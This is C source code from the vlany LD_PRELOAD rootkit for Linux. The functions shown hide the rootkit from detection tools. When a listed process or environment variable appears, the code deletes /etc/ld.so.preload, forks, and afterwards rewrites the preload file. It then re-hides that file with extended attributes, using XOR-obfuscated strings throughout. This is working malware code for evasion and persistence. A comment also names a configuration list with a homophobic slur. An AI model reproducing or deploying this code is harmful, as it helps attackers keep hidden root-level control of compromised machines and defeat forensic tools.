// These functions handle vlany's temporary uninstallation to hide from certain utilities
// There's a list in config.py called GAY_PROCS which has a list of names of binaries/processes/environment variables.
// execve.c uses this list to uninstall vlany whenever a certain string is found

void reinstall(void)
{
    #ifdef DEBUG
        printf("[vlany] reinstall() called\n");
    #endif

    HOOK(old_xstat, C__XSTAT);
    HOOK(old_access, CACCESS);

    FILE *preload;
    struct stat s_fstat;

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
    memset(&s_fstat, 0, sizeof(stat));
    old_xstat(_STAT_VER, ld_preload, &s_fstat);

    char *lib_location = strdup(LIB_LOCATION); xor(lib_location);

    if(s_fstat.st_size != strlen(lib_location) || old_access(ld_preload, F_OK) == -1)
    {
        #ifdef DEBUG
            printf("[vlany] ld.so.preload inconsistent. attempting to rewrite.\n");
        #endif

        HOOK(old_fopen, CFOPEN);

        if((preload = old_fopen(ld_preload, "w")))
        {
            HOOK(old_fwrite, CFWRITE); // I don't like resolving symbols when I don't have to

            #ifdef DEBUG
                printf("[vlany] rewriting ld.so.preload\n");
            #endif

            old_fwrite(lib_location, strlen(lib_location), 1, preload);
            fflush(preload); fclose(preload);
        }

        // the preload file was removed somehow, now we need to hide it again
        char xattr_user[256];
        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
        char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
        char *xattr = strdup(XATTR);

        xor(hidden_xattr_1_str); xor(xattr);
        snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
        CLEAN(xattr); CLEAN(hidden_xattr_1_str);

        xor(hidden_xattr_2_str);
        HOOK(old_setxattr, CSETXATTR);
        old_setxattr(ld_preload, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE); // no need to check for a return value
        CLEAN(hidden_xattr_2_str);
    }
    CLEAN(lib_location);
    CLEAN(ld_preload);
}

int hide_vlany(const char *filename, const char *proc, int ret)
{
    #ifdef DEBUG
        printf("[vlany] hide_vlany() called\n");
    #endif

    char *proc_me = procname_self(), fnm_proc[64];
    snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", proc);

    if(strstr(proc_me, proc) || strstr(filename, proc) || !fnmatch(fnm_proc, filename, FNM_PATHNAME) || getenv(proc))
    {
        if(getuid() != 0 && geteuid() != 0) return 0;

        HOOK(old_unlink, CUNLINK);

        char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
        old_unlink(ld_preload); // uninstall the rootkit for now..
        CLEAN(ld_preload);

        int pid;
        if((pid = fork()) == -1) return -1;
        else if(pid == 0) return 2;

        wait(&ret);
        reinstall(); // REWRITE IT ALL
        return 1;
    }
    return 3; // let's just satisfy gcc...and we can't return a value above.
}
